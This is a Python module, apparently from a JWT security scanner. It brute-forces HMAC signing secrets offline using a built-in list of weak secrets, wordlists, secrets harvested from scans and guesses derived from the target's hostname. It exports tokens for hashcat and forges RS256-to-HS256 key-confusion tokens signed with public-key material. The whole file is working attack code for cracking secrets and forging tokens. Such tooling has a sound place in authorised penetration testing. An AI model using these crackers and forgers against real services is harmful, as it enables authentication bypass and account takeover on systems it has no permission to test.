"""
Offline HS* cracking: weak secrets, wordlists, target mutations, HMAC verify,
and RS256→HS256 key-confusion forge helpers.
"""

import hashlib
import hmac
import json
from urllib.parse import urlparse

from modules.jwt.decode import b64url_decode, b64url_encode, decode_jwt

# Secrets worth trying for offline HS* verification (common JWT defaults +
# jwt_tool/SecLists-style common secrets)
WEAK_SECRETS = [
    # Core defaults
    "secret", "password", "Password1", "123456", "12345678", "qwerty",
    "admin", "test", "changeme", "jwtsecret", "jwt-secret", "jwt_secret",
    "supersecret", "your-256-bit-secret", "your-secret-key", "mysecret",
    "dev", "development", "production", "private", "keyboard cat",
    "HS256", "abcdef", "secretkey", "secret_key", "app_secret",
    "please-change-me", "insecure", "default", "token", "auth",
    # Common password / JWT wordlist entries
    "password123", "admin123", "root", "qwerty123", "letmein", "welcome",
    "monkey", "dragon", "master", "shadow", "login", "pass", "abc123",
    "111111", "123123", "654321", "iloveyou", "princess", "football",
    "baseball", "trustno1", "sunshine", "starwars", "whatever", "freedom",
    "secret123", "key", "hmac", "changeme123", "Password1!", "P@ssw0rd",
    "admin1", "test123", "demo", "sample", "example", "temp", "tmp",
    "SECRET", "Secret", "SECRET_KEY", "JWT_SECRET", "APP_SECRET",
    "AUTH_SECRET", "SESSION_SECRET", "SIGNING_KEY", "HMAC_KEY",
    "devsecret", "prodsecret", "stage", "staging", "localhost",
    "super-secret", "my-secret", "the-secret", "a-secret",
    "123456789", "1234567890", "000000", "1111", "passw0rd",
    "qwertyuiop", "asdfghjkl", "zxcvbnm", "1q2w3e4r", "1qaz2wsx",
    "hunter2", "correcthorsebatterystaple", "you-shall-not-pass",
]


def load_wordlist(path):
    """Load newline-delimited secrets from a wordlist file (skips blanks/#)."""
    candidates = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                s = line.strip()
                if s and not s.startswith("#"):
                    candidates.append(s)
    except OSError:
        return []
    return candidates


def target_mutations(target):
    """
    Derive likely HMAC secrets from a target URL's host labels.
    e.g. https://app.example.com → example, app, appexample, examplesecret, ...
    """
    if not target:
        return []
    try:
        host = urlparse(target if "//" in target else f"https://{target}").hostname or ""
    except Exception:
        return []
    if not host:
        return []
    labels = [p for p in host.lower().replace("-", "").split(".") if p and p != "www"]
    if not labels:
        return []

    bases = []
    for lab in labels:
        if lab not in ("com", "org", "net", "io", "co", "in", "gov", "edu"):
            bases.append(lab)
    if len(labels) >= 2:
        bases.append(labels[0] + labels[1])
    bases = list(dict.fromkeys(bases))[:6]

    suffixes = ["", "secret", "key", "123", "2024", "2025", "2026", "jwt", "auth"]
    mutations = []
    for b in bases:
        for suf in suffixes:
            mutations.append(f"{b}{suf}")
        mutations.append(b.capitalize())
        mutations.append(f"{b}-secret")
        mutations.append(f"{b}_secret")
    return list(dict.fromkeys(mutations))


def export_hashcat(tokens, path):
    """
    Write JWTs in hashcat mode 16500 format (one full compact JWT per line).
    Only HS* tokens are crackable in 16500 — filter to those.
    Returns count written.
    """
    written = 0
    try:
        with open(path, "w", encoding="utf-8") as fh:
            for t in tokens or []:
                d = decode_jwt(t)
                if d.get("error"):
                    continue
                alg = (d.get("alg") or "").upper()
                if alg not in ("HS256", "HS384", "HS512"):
                    continue
                fh.write(t.rstrip("\n") + "\n")
                written += 1
    except OSError:
        return 0
    return written


def verify_hs_signature(token, secret):
    """Constant-time HMAC verify for HS256/384/512. Returns bool or None if unsupported."""
    decoded = decode_jwt(token)
    if decoded.get("error"):
        return None
    alg = decoded.get("alg", "").upper()
    hashes = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in hashes:
        return None
    parts = token.split(".")
    if len(parts) != 3 or not parts[2]:
        return False
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    try:
        expected = hmac.new(
            str(secret).encode("utf-8"), signing_input, hashes[alg]
        ).digest()
        actual = b64url_decode(parts[2])
    except Exception:
        return None
    return hmac.compare_digest(expected, actual)


def forge_hs256_token(header, payload, secret):
    """Construct an HS256 compact JWT signed with `secret` (key-confusion PoC helper)."""
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    sig = hmac.new(
        str(secret).encode("utf-8"), f"{h}.{p}".encode("ascii"), hashlib.sha256
    ).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def try_key_confusion(decoded, key_materials):
    """
    RS256→HS256 key-confusion PoC: re-sign the same payload as HS256 using
    each public-key material as the HMAC secret. Returns (forged_token, material)
    or (None, None). Offline — proves forgeability when public key material is known.
    """
    if not key_materials:
        return None, None
    header = dict(decoded.get("header") or {})
    if (header.get("alg") or "").upper() not in ("RS256", "RS384", "RS512"):
        return None, None
    header["alg"] = "HS256"
    for drop in ("jwk", "jku", "x5u", "x5c", "crit"):
        header.pop(drop, None)
    payload = decoded.get("payload") or {}
    for mat in key_materials:
        if not mat:
            continue
        forged = forge_hs256_token(header, payload, mat)
        if verify_hs_signature(forged, mat) is True:
            return forged, mat
    return None, None


def _try_crack_hs(token, candidate_secrets=None):
    """Try weak + scan-derived secrets against an HS* JWT. Returns cracked secret or None."""
    candidates = []
    for s in WEAK_SECRETS:
        candidates.append(s)
    for s in candidate_secrets or []:
        if s and s not in candidates:
            candidates.append(s)
    for secret in candidates:
        if verify_hs_signature(token, secret) is True:
            return secret
    return None


def collect_candidate_secrets(result):
    """Pull secret-looking string values from a scan result for HS* cracking."""
    candidates = []
    for s in result.get("secrets_found", []):
        match = s.get("match", "")
        typ = s.get("type", "")
        if typ == "JWT" or match.startswith("eyJ"):
            continue
        if match.startswith("http") or "://" in match:
            continue
        if len(match) >= 6 and len(match) <= 200:
            candidates.append(match)
    return list(dict.fromkeys(candidates))


def build_crack_candidates(result, wordlist_path=None, target=None):
    """
    Assemble the full offline crack candidate list:
    built-in WEAK_SECRETS + in-scan secrets + optional wordlist file + target mutations.
    Returns (candidates, meta) where meta records counts for reporting.
    """
    scan_secrets = collect_candidate_secrets(result)
    wordlist = load_wordlist(wordlist_path) if wordlist_path else []
    mutations = target_mutations(target)

    seen = set()
    candidates = []
    for s in list(WEAK_SECRETS) + scan_secrets + wordlist + mutations:
        if s and s not in seen:
            seen.add(s)
            candidates.append(s)

    meta = {
        "builtin": len(WEAK_SECRETS),
        "scan_secrets": len(scan_secrets),
        "wordlist": len(wordlist),
        "target_mutations": len(mutations),
        "total": len(candidates),
    }
    return candidates, meta
